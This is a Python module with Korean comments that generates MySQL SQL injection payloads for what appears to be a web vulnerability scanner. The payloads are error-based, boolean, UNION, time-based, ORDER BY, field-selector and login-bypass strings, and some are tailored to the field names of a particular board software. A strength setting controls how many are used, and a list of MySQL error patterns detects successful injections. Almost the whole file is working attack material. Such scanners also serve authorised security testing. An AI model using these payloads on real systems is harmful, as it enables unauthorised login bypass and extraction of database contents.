from typing import Dict, List, Optional

Payload = Dict[str, str]

_SLEEP_SECS = 5

# 공격 강도별 payload 개수 제한
STRENGTH_LIMIT = {
    "LOW": 3,
    "MEDIUM": 6,
    "HIGH": 12,
    "INSANE": 100,
}

# MySQL 오류 탐지 패턴
ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "xpath syntax error",
    "extractvalue(",
    "updatexml(",
    "duplicate entry",
    "column count doesn't match",
    "the used select statements have a different number",
    "supplied argument is not a valid mysql",
    "division by zero",
    "unknown column",
    "com.mysql.jdbc.exceptions",
    "org.gjt.mm.mysql",
]

# 문자열 컨텍스트용 Error-based SQLi
ERROR_BASED: List[Payload] = [
    {"type": "SQLI_ERROR", "family": "extractvalue_database", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
    {"type": "SQLI_ERROR", "family": "extractvalue_version", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
    {"type": "SQLI_ERROR", "family": "extractvalue_user", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"},
    {"type": "SQLI_ERROR", "family": "updatexml_database", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
    {"type": "SQLI_ERROR", "family": "updatexml_version", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
    {"type": "SQLI_ERROR", "family": "floor_rand_group", "payload": "' AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -"},
]

# 문자열 컨텍스트용 Boolean SQLi
BOOLEAN_BASED: List[Payload] = [
    {"type": "SQLI_BOOL", "family": "or_tautology", "payload": "' OR '1'='1"},
    {"type": "SQLI_BOOL", "family": "and_true", "payload": "' AND '1'='1'-- -"},
    {"type": "SQLI_BOOL", "family": "and_false", "payload": "' AND '1'='2'-- -"},
    {"type": "SQLI_BOOL", "family": "or_numeric_true", "payload": "' OR 1=1-- -"},
    {"type": "SQLI_BOOL", "family": "ascii_compare", "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
    {"type": "SQLI_BOOL", "family": "length_check", "payload": "' AND LENGTH(database())>1-- -"},
]

# sfl 같은 필드 선택자 컨텍스트
FIELD_SELECTOR = [
    {"type": "SQLI_FIELD_BOOL", "family": "fs_true", "payload": "wr_subject AND 1=1-- -"},
    {"type": "SQLI_FIELD_BOOL", "family": "fs_false", "payload": "wr_subject AND 1=2-- -"},
    {"type": "SQLI_FIELD_TIME", "family": "fs_sleep", "payload": "wr_subject AND SLEEP(5)-- -"},
    {"type": "SQLI_FIELD_ERROR", "family": "fs_extractvalue", "payload": "wr_subject AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
]

# ORDER BY 정렬 차이 기반 SQLi
ORDERBY_INJECT = [
    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_datetime", "payload": "wr_datetime"},
    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_hit", "payload": "wr_hit"},
    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_true", "payload": "CASE WHEN 1=1 THEN wr_datetime ELSE wr_hit END"},
    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_false", "payload": "CASE WHEN 1=2 THEN wr_datetime ELSE wr_hit END"},
    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_true", "payload": "IF(1=1,wr_datetime,wr_hit)"},
    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_false", "payload": "IF(1=2,wr_datetime,wr_hit)"},
]

# 로그인 인증 우회 SQLi
AUTH_BYPASS: List[Payload] = [
    {"type": "SQLI_AUTH", "family": "auth_or_string_true", "payload": "' OR '1'='1'-- -"},
    {"type": "SQLI_AUTH", "family": "auth_or_numeric_true", "payload": "' OR 1=1-- -"},
    {"type": "SQLI_AUTH", "family": "auth_or_like_true", "payload": "' OR 'a'='a'-- -"},
    {"type": "SQLI_AUTH", "family": "auth_double_quote", "payload": "\" OR \"1\"=\"1\"-- -"},
    {"type": "SQLI_AUTH", "family": "auth_comment_only", "payload": "'-- -"},
    {"type": "SQLI_AUTH", "family": "auth_error_extract", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
]

# Time-based SQLi 템플릿
_TIME_TEMPLATES = [
    ("time_string_and_sleep_sq", "{orig}' AND SLEEP({sleep})-- -"),
    ("time_string_and_sleep_dq", '{orig}" AND SLEEP({sleep})-- -'),
    ("time_string_or_sleep_sq", "{orig}' OR SLEEP({sleep})-- -"),
    ("time_if_sleep_sq", "{orig}' AND IF(1=1,SLEEP({sleep}),0)-- -"),
    ("time_subquery_sleep_sq", "{orig}' AND 0 IN (SELECT SLEEP({sleep}))-- -"),
    ("time_numeric_sleep", "0 OR SLEEP({sleep})"),
    ("time_numeric_if", "0 OR IF(1=1,SLEEP({sleep}),0)"),
    ("time_benchmark", "{orig}' OR BENCHMARK({benchmark_count},MD5(1))-- -"),
]


def match_error(response_body: str) -> Optional[str]:
    body_lower = response_body.lower()
    for pattern in ERROR_PATTERNS:
        if pattern.lower() in body_lower:
            return pattern
    return None


def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]


def _build_union_null_probes(max_cols: int = 6) -> List[Payload]:
    probes = []
    for n in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * n)
        probes.append({
            "type": "SQLI_UNION",
            "family": f"null_probe_{n}",
            "payload": f"' UNION SELECT {nulls}-- -",
        })
    return probes


# UNION 컬럼 수 탐지 및 정보 추출
UNION_BASED: List[Payload] = _build_union_null_probes() + [
    {"type": "SQLI_UNION", "family": "version_extract", "payload": "' UNION SELECT version(),NULL,NULL-- -"},
    {"type": "SQLI_UNION", "family": "database_extract", "payload": "' UNION SELECT database(),NULL,NULL-- -"},
    {"type": "SQLI_UNION", "family": "user_extract", "payload": "' UNION SELECT user(),NULL,NULL-- -"},
]


def build_boolean(orig: str = "1") -> List[Payload]:
    return [
        {"type": "SQLI_BOOL", "family": "dq_true_cond", "payload": f'{orig}" AND "1"="1" -- '},
        {"type": "SQLI_BOOL", "family": "dq_false_cond", "payload": f'{orig}" AND "1"="2" -- '},
        {"type": "SQLI_BOOL", "family": "sq_true_cond", "payload": f"{orig}' AND '1'='1' -- "},
        {"type": "SQLI_BOOL", "family": "sq_false_cond", "payload": f"{orig}' AND '1'='2' -- "},
    ]


def build_auth(orig: str = "user") -> List[Payload]:
    return [
        {"type": "SQLI_AUTH", "family": "auth_orig_comment", "payload": f"{orig}'-- -"},
        {"type": "SQLI_AUTH", "family": "auth_orig_or_true", "payload": f"{orig}' OR '1'='1'-- -"},
        *AUTH_BYPASS,
    ]


def build_time_based(orig: str = "1", sleep: int = _SLEEP_SECS) -> List[Payload]:
    results: List[Payload] = []
    for family, template in _TIME_TEMPLATES:
        values = {
            "orig": orig,
            "sleep": sleep,
            "benchmark_count": sleep * 1_000_000,
        }
        results.append({
            "type": "SQLI_TIME",
            "family": family,
            "payload": template.format(**values),
        })
    return results


# SQL 컨텍스트별 payload 선택
def get_by_sql_context(
    context: str,
    strength: str = "MEDIUM",
    orig: str = "1",
) -> List[Payload]:
    normalized = context.lower()

    if normalized == "orderby":
        payloads = ORDERBY_INJECT
    elif normalized == "field_selector":
        payloads = FIELD_SELECTOR
    elif normalized == "auth":
        payloads = build_auth(orig if orig != "1" else "user") + ERROR_BASED + build_time_based(orig)
    elif normalized in {"like_string", "cve_prefix"}:
        payloads = ERROR_BASED + BOOLEAN_BASED + build_boolean(orig) + UNION_BASED + build_time_based(orig)
    else:
        payloads = get_by_strength("INSANE", orig)

    return _limit(payloads, strength)


def get_by_strength(strength: str = "MEDIUM", orig: str = "1") -> List[Payload]:
    payloads = ERROR_BASED + BOOLEAN_BASED + build_boolean(orig) + UNION_BASED + build_time_based(orig)
    return _limit(payloads, strength)


def get_all(orig: str = "1") -> List[Payload]:
    return (
        ERROR_BASED
        + BOOLEAN_BASED
        + build_boolean(orig)
        + UNION_BASED
        + build_time_based(orig)
        + FIELD_SELECTOR
        + ORDERBY_INJECT
        + build_auth(orig if orig != "1" else "user")
    )